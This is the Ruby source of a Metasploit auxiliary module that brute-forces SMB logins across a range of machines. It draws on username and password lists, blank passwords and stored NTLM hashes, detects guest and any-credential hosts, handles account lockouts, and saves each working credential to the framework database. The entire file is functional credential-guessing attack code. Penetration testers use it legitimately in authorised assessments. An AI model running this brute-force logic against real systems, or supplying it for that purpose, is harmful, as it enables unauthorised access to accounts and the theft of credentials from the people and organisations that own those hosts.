##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/smb'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Exploit::Remote::SMB::Client::Authenticated

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  Aliases = [
    'auxiliary/scanner/smb/login'
  ]

  def proto
    'smb'
  end
  def initialize
    super(
      'Name'           => 'SMB Login Check Scanner',
      'Description'    => %q{
        This module will test a SMB login on a range of machines and
        report successful logins.  If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
      },
      'Author'         =>
        [
          'tebo <tebo[at]attackresearch.com>', # Original
          'Ben Campbell', # Refactoring
          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>', # admin check
          'Tom Sellers <tom[at]fadedcode.net>' # admin check/bug fix
        ],
      'References'     =>
        [
          [ 'CVE', '1999-0506'], # Weak password
        ],
      'License'     => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'DB_ALL_CREDS'    => false,
          'BLANK_PASSWORDS' => false,
          'USER_AS_PASS'    => false
        }
    )

    # These are normally advanced options, but for this module they have a
    # more active role, so make them regular options.
    register_options(
      [
        Opt::Proxies,
        OptBool.new('ABORT_ON_LOCKOUT', [ true, "Abort the run when an account lockout is detected", false ]),
        OptBool.new('PRESERVE_DOMAINS', [ false, "Respect a username that contains a domain name.", true ]),
        OptBool.new('RECORD_GUEST', [ false, "Record guest-privileged random logins to the database", false ]),
        OptBool.new('DETECT_ANY_AUTH', [false, 'Enable detection of systems accepting any authentication', false]),
        OptBool.new('DETECT_ANY_DOMAIN', [false, 'Detect if domain is required for the specified user', false])
      ])

    deregister_options('RHOST', 'USERNAME','PASSWORD', 'PASSWORD_SPRAY')
  end

  def run_host(ip)
    print_brute(:level => :vstatus, :ip => ip, :msg => "Starting SMB login bruteforce")

    domain = datastore['SMBDomain'] || ""

    @scanner = Metasploit::Framework::LoginScanner::SMB.new(
      host: ip,
      port: rport,
      local_port: datastore['CPORT'],
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      proxies: datastore['PROXIES'],
      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
      connection_timeout: 5,
      max_send_size: datastore['TCP::max_send_size'],
      send_delay: datastore['TCP::send_delay'],
      framework: framework,
      framework_module: self,
    )

    if datastore['DETECT_ANY_AUTH']
      bogus_result = @scanner.attempt_bogus_login(domain)
      if bogus_result.success?
        if bogus_result.access_level == Metasploit::Framework::LoginScanner::SMB::AccessLevels::GUEST
          print_status("This system allows guest sessions with random credentials")
        else
          print_error("This system accepts authentication with random credentials, brute force is ineffective.")
          return
        end
      else
        vprint_status('This system does not accept authentication with random credentials, proceeding with brute force')
      end
    end

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['SMBPass'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['SMBUser'],
      user_as_pass: datastore['USER_AS_PASS'],
      realm: domain,
    )

    cred_collection = prepend_db_passwords(cred_collection)
    cred_collection = prepend_db_hashes(cred_collection)

    @scanner.cred_details = cred_collection

    @scanner.scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::LOCKED_OUT
        if datastore['ABORT_ON_LOCKOUT']
          print_error("Account lockout detected on '#{result.credential.public}', aborting.")
          return
        else
          print_error("Account lockout detected on '#{result.credential.public}', skipping this user.")
        end

      when Metasploit::Model::Login::Status::DENIED_ACCESS
        print_brute :level => :status, :ip => ip, :msg => "Correct credentials, but unable to login: '#{result.credential}', #{result.proof}"
        report_creds(ip, rport, result)
        :next_user
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' #{result.access_level}"
        report_creds(ip, rport, result)
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        if datastore['VERBOSE']
          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
        end
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
            realm_value: result.credential.realm,
            status: result.status
        )
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        if datastore['VERBOSE']
          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}', #{result.proof}"
        end
        invalidate_login(
          address: ip,
          port: rport,
          protocol: 'tcp',
          public: result.credential.public,
          private: result.credential.private,
          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
          realm_value: result.credential.realm,
          status: result.status
        )
      end
    end

  end


  # This logic is not universal ie a local account will not care about workgroup
  # but remote domain authentication will so check each instance
  def accepts_bogus_domains?(user, pass)
    bogus_domain = @scanner.attempt_login(
      Metasploit::Framework::Credential.new(
        public: user,
        private: pass,
        realm: Rex::Text.rand_text_alpha(8)
      )
    )

    return bogus_domain.success?
  end

  def report_creds(ip, port, result)
    if !datastore['RECORD_GUEST']
      if result.access_level == Metasploit::Framework::LoginScanner::SMB::AccessLevels::GUEST
        return
      end
    end

    service_data = {
      address: ip,
      port: port,
      service_name: 'smb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: (
        Rex::Proto::NTLM::Utils.is_pass_ntlm_hash?(result.credential.private) ? :ntlm_hash : :password
      ),
      username: result.credential.public,
    }.merge(service_data)

    if datastore['DETECT_ANY_DOMAIN'] && domain.present?
      if accepts_bogus_domains?(result.credential.public, result.credential.private)
        print_brute(:level => :vstatus, :ip => ip, :msg => "Domain is ignored for user #{result.credential.public}")
      else
        credential_data.merge!(
          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
          realm_value: result.credential.realm
        )
      end
    end

    credential_core = create_credential(credential_data)

    login_data = {
      access_level: result.access_level,
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: result.status
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
